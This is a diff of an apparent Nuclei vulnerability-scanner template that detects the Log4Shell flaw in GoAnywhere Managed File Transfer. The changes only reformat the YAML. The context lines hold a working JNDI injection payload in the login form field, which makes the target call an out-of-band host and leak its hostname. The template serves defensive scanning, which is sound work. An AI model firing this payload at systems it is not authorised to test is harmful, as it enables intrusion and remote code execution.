@@ -19,7 +19,6 @@ info:
     shodan-query: http.html:"GoAnywhere Managed File Transfer"
     verified: true
   tags: cve,cve2021,jndi,log4j,rce,oast,goanywhere,kev
-
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
@@ -29,7 +28,6 @@ http:
       - |
         GET /goanywhere/auth/Login.xhtml HTTP/1.1
         Host: {{Hostname}}
-
       - |
         POST /goanywhere/auth/Login.xhtml HTTP/1.1
         Host: {{Hostname}}
@@ -40,39 +38,40 @@ http:
         formPanel%3AloginGrid%3Aname=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.name.{{interactsh-url}}}&formPanel%3AloginGrid%3Avalue_hinput=pass&formPanel%3AloginGrid%3Avalue={{view}}}&formPanel%3AloginGrid%3AloginButton=&loginForm_SUBMIT=1&javax.faces.ViewState={{view}}
 
     cookie-reuse: true
+
     matchers-condition: and
     matchers:
       - type: word
-        part: interactsh_protocol  # Confirms the DNS Interaction
+        part: interactsh_protocol # Confirms the DNS Interaction
         words:
           - "dns"
 
       - type: regex
         part: interactsh_request
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
 
     extractors:
       - type: regex
         name: view
-        part: body
         group: 1
         regex:
           - 'javax\.faces\.ViewState:1" value="(.*)" autocomplete'
         internal: true
+        part: body
 
       - type: kval
         kval:
           - interactsh_ip # Print remote interaction IP in output
 
       - type: regex
-        part: interactsh_request
         group: 2
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print injection point in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
+        part: interactsh_request
 
       - type: regex
-        part: interactsh_request
         group: 1
         regex:
-          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
